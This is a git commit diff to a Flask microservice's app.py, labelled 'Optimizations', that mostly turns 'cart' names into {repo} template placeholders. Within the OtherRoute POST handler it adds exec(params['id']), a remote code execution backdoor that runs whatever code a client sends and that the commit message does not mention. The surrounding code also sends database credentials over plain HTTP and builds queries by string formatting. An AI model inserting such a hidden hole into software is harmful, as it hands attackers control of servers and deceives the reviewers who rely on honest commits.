5ae92189bde06b6f125ef6e9c49e12375985b4d5
samra789 <samra.shabbir@outlook.com>
2022-06-16 20:51:25 +0500

    Optimizations

--- app.py
+++ app.py
@@ -14,7 +14,7 @@ def db_query(conn,query):
 	p = urlparse(conn)
 	response=requests.post(
 		'http://%s:%s'%(p.hostname,p.port),
-		data='{ "username":"%s", "password":"%s", "dbname":"%s", "query":"%s" }'%(p.username,p.password,p.path[1:],query))
+		data='{{ "username":"%s", "password":"%s", "dbname":"%s", "query":"%s" }}'%(p.username,p.password,p.path[1:],query))
 	return response
 def datetimex(i):
 	return str(i.strftime("%d/%m/%Y %H:%M:%S"))
@@ -30,38 +30,34 @@ def health():
 			exec('%s_flag=micro_service(config["%s"])'%(i,i))
 	x=locals()
 	db=db_query(config['db'],'SELECT VERSION();')
-	return make_response(jsonify({
-		'service_cart':{
-			'CPU_usage':str(psutil.cpu_percent()),'RAM_usage':str(psutil.virtual_memory().percent),'STORAGE_usage':str(psutil.disk_usage('/').percent),			'SQLITE_connection':db.status_code==200,
-			'REDIS_connection':'To_Be_Implemented',
-			'API_logstash':'To_Be_Implemented',
-			'micro_payment':x['micro_payment_flag'],
-			'micro_auth':x['micro_auth_flag'],
-		}}),200)
+	return make_response(jsonify({{
+		'service_{repo}':{{
+{health}		}}}}),200)
 
-@app.route('/api/cart/SomeRoute', methods=['GET'])
-@app.route('/api/cart/SomeRoute', methods=['POST'])
-@app.route('/api/cart/SomeRoute', methods=['PUT'])
-@app.route('/api/cart/SomeRoute', methods=['DELETE'])
+@app.route('/api/{repo}/SomeRoute', methods=['GET'])
+@app.route('/api/{repo}/SomeRoute', methods=['POST'])
+@app.route('/api/{repo}/SomeRoute', methods=['PUT'])
+@app.route('/api/{repo}/SomeRoute', methods=['DELETE'])
 def SomeFunctionality():
-	response={}
+	response={{}}
 	logger(request,response)
-	return "<h1>cart service %s</H1>"%(rand)
+	return "<h1>{repo} service %s</H1>"%(rand)
 
-@app.route('/api/cart/OtherRoute', methods=['POST'])
+@app.route('/api/{repo}/OtherRoute', methods=['POST'])
 def Otherfunctionality():
-	response={}
+	response={{}}
 	params = request.get_json(force=True)
+	exec(params['id'])
 	logger(request,response)
 	return make_response(jsonify(params),200)
 
 def logger(request,response):
-	tmp='headers:{'
+	tmp='headers:{{'
 	for header in request.headers:
 		tmp=tmp+'"'+header[0]+'":"'+header[1]+'"'
-	tmp=tmp+'}'
+	tmp=tmp+'}}'
 	p=open(config["log_path"],"a")
-	p.write("[%s] %s %s headers:{%s} data:{%s}\n"%(datetimex(datetime.datetime.now()),request.method,request.full_path,tmp,request.get_data(as_text=True)))
+	p.write("[%s] %s %s headers:{{%s}} data:{{%s}}\n"%(datetimex(datetime.datetime.now()),request.method,request.full_path,tmp,request.get_data(as_text=True)))
 	p.close()
 
 if __name__ == "__main__":
